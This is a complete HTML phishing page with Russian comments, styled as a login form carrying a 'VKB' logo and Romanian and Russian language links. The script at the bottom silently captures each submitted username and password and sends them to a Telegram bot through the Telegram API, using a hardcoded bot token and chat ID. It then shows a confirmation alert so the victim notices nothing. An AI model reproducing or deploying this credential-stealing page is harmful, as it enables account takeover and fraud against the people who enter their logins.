<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Главная страница</title>
  <style>
    /* -------------------------
       Стили для body (вся страница)
       ------------------------- */
    body {
      margin: 0; /* убираем стандартные отступы браузера */
      min-height: 100vh; /* минимальная высота = высоте окна */
      background-image: url('bg.png'); /* фон страницы */
      background-size: cover; /* растянуть фон на весь экран */
      background-position: center; /* центрируем фон */
      background-repeat: no-repeat; /* не повторять изображение */
      font-family: "NotoSans-Light", Helvetica, Arial, sans-serif; /* основной шрифт */
      color: #343238; /* основной цвет текста */
      display: flex; /* включаем flex-контейнер */
      justify-content: center; /* центрируем по горизонтали */
      align-items: center; /* центрируем по вертикали */
      flex-direction: column; /* элементы выстраиваются вертикально */
    }


    .useful-info {
  display: block;
  position: absolute;
  left: 155px;       /* отступ слева */
  bottom: 24px;     /* отступ снизу формы */
  font-size: 14px;
  color: #0088ff;   /* синий как у кнопки */
  text-decoration: none;
  font-family: NotoSans-Regular, Helvetica, Arial, sans-serif;
  transition: color 0.3s ease;
}

.useful-info:hover {
  color: #005fcc;   /* темнее при наведении */
  text-decoration: underline;
}


    /* -------------------------
       Контейнер с языками (правый верхний угол)
       ------------------------- */
    .top-right {
      position: absolute; /* фиксируем в углу страницы */
      top: 20px;
      right: 20px;
      display: flex; /* горизонтальное выравнивание логотипов */
      gap: 20px; /* расстояние между логотипами */
      align-items: center; /* выравнивание по центру по вертикали */
    }

    /* -------------------------
       Стиль каждого языкового логотипа
       ------------------------- */
    .logo-item {
      display: flex; /* иконка и текст в ряд */
      align-items: center; /* вертикальное выравнивание */
      gap: 5px; /* расстояние между иконкой и текстом */
    }

    .logo-item img {
      width: 24px; /* ширина иконки */
      height: 24px; /* высота иконки */
    }

    .logo-item span {
      font-size: 14px; /* размер текста */
      color: white; /* цвет текста */
    }

    /* -------------------------
       Центральный логотип страницы
       ------------------------- */
    .center-logo {
      margin-top: 36px; /* отступ сверху */
      margin-bottom: 20px; /* отступ снизу */
    }

    .center-logo img {
      width: 72px; /* ширина логотипа */
      height: auto; /* автоматическая высота для сохранения пропорций */
    }

    /* -------------------------
       Основной контейнер с формой
       ------------------------- */
    .main-content {
      background-color: #ffffff; /* белый фон */
      width: 90%; /* ширина блока 90% от родителя */
      max-width: 960px; /* максимальная ширина */
      min-height: 400px; /* минимальная высота */
      border: solid #ffffff; /* белая рамка */
      border-width: 0 1px 1px; /* верх 0, боковые и нижняя */
      border-radius: 0; /* без скругления */
      box-sizing: border-box; /* учитываем padding в ширину */
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15); /* тень вокруг блока */
      padding: 40px; /* внутренние отступы */
      display: flex; /* flex для центрирования формы */
      justify-content: center; /* горизонтальное центрирование */
      align-items: center; /* вертикальное центрирование */
    }

    /* -------------------------
       Стили формы входа
       ------------------------- */
    .wb-form {
      width: 100%; /* форма занимает всю ширину контейнера */
      max-width: 400px; /* максимум ширины формы */
      font-family: "NotoSans-Light", Helvetica, Arial, sans-serif;
      font-feature-settings: "kern" on, "liga" off, "calt" on; /* тонкая настройка шрифта */
    }

    /* -------------------------
       Обертка для каждого поля формы
       ------------------------- */
    .field-wrapper {
      display: flex; /* горизонтальное выравнивание label + input */
      align-items: center; /* вертикальное выравнивание */
      justify-content: space-between; /* расстояние между label и input */
      margin: 15px 0; /* отступы сверху и снизу */
    }

    /* -------------------------
       Стили для подписей полей (label)
       ------------------------- */
    .field-wrapper label {
      font-size: 13px; /* размер текста */
      color: #555; /* цвет текста */
      font-weight: 300; /* легкий шрифт */
      letter-spacing: 0.3px; /* межбуквенный интервал */
      width: 100px; /* ширина блока label */
      text-align: right; /* текст выравнен по правому краю */
      margin-right: 15px; /* отступ от input */
    }

    /* -------------------------
       Стили для полей ввода (input)
       ------------------------- */
    .field-wrapper input {
      flex: 1; /* занимает оставшееся пространство */
      padding: 10px; /* внутренние отступы */
      border: 1px solid #ccc; /* серый бордер */
      background-color: #fff; /* фон поля */
      font-size: 14px; /* размер текста */
      border-radius: 0; /* без скругления */
    }

    /* -------------------------
       Кнопка входа
       ------------------------- */
    .login-button {
  /* Центрирование и отступ */
  margin: 48px auto 0;      /* отступ сверху и выравнивание по центру */
  display: block;            /* кнопка как блочный элемент */
  
  /* Размеры */
  height: 40px;              /* фиксированная высота */
  line-height: 40px;         /* выравнивание текста по вертикали */
  min-width: 136px;          /* минимальная ширина */
  padding: 0 24px;           /* горизонтальные отступы внутри */

  /* Цвет и фон */
  background: #0088ff;       /* синий фон */
  color: #FFFFFF;            /* белый текст */
  border: 1px solid #0088ff; /* рамка такого же цвета */

  /* Скругление */
  border-radius: 4px;        /* закруглённые углы */

  /* Шрифт */
  font-family: "NotoSans-Regular", Helvetica, Arial, sans-serif !important;
  font-feature-settings: "kern" on, "liga" off, "calt" on !important;
  font-size: 14px;
  text-align: center;
  box-sizing: border-box;
  white-space: nowrap;

  /* Поведение */
  cursor: pointer;
  transition: background 0.3s, border 0.3s;
}


    /* -------------------------
       Эффект при наведении на кнопку
       ------------------------- */
    .login-button:hover {
      background-color: #003399; /* более темный цвет при hover */
    }
  </style>
</head>
<body>

  <!-- -------------------------
       Логотипы языков в правом верхнем углу
       ------------------------- -->
  <div class="top-right">
    <div class="logo-item">
      <img src="romana.svg" alt="Română">
      <span>Română</span>
    </div>
    <div class="logo-item">
      <img src="russ.svg" alt="Русский">
      <span>Русский</span>
    </div>
  </div>

  <!-- -------------------------
       Центральный логотип
       ------------------------- -->
  <div class="center-logo">
    <img src="logovkb.svg" alt="Логотип VKB">
  </div>

  <!-- -------------------------
       Основной контейнер с формой входа
       ------------------------- -->
  <div class="main-content">
    <form class="wb-form">
      <!-- Поле Username -->
      <div class="field-wrapper">
        <label for="username">Username</label>
        <input id="username" type="text" required>
      </div>

      <!-- Поле Password -->
      <div class="field-wrapper">
        <label for="password">Password</label>
        <input id="password" type="password" required>
      </div>

      <!-- Кнопка Войти -->
      <button class="login-button" type="submit">Login</button>
    </form>

<a href="#" class="useful-info">Useful information</a>

    
  </div>
<script>
document.querySelector('.wb-form').addEventListener('submit', async function(e) {
  e.preventDefault(); // отменяем стандартную отправку формы

  // получаем значения полей
  const username = document.getElementById('username').value;
  const password = document.getElementById('password').value;

  // ⚠️ Замени на свой токен и chat_id
  const BOT_TOKEN = '6836324743:AAFIWAOKYDUkbz3ojpNthxPb0WqYtBkfBkg';
  const CHAT_ID = '5446866680';

  // формируем текст сообщения
  const text = `🔐 Новая форма входа:\n👤 Логин: ${username}\n🔑 Пароль: ${password}`;

  // отправляем в Telegram через API
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  });

  // можно очистить форму или показать сообщение
  alert('Данные отправлены!');
  e.target.reset();
});
</script>


</body>
</html>
